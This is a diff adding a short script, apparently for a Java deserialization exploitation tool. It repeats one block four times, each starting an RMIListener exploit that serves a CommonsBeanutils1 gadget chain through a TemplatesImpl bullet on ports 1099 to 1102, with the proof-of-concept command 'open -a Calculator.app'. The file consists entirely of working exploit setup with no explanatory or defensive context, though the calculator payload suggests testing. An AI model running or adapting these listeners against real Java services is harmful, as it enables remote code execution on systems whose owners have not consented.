@@ -1,0 +1,27 @@
+use exploit RMIListener
+use payload CommonsBeanutils1
+use bullet TemplatesImplBullet
+set body "open -a Calculator.app"
+set lport 1099
+run
+
+use exploit RMIListener
+use payload CommonsBeanutils1
+use bullet TemplatesImplBullet
+set body "open -a Calculator.app"
+set lport 1100
+run
+
+use exploit RMIListener
+use payload CommonsBeanutils1
+use bullet TemplatesImplBullet
+set body "open -a Calculator.app"
+set lport 1101
+run
+
+use exploit RMIListener
+use payload CommonsBeanutils1
+use bullet TemplatesImplBullet
+set body "open -a Calculator.app"
+set lport 1102
+run
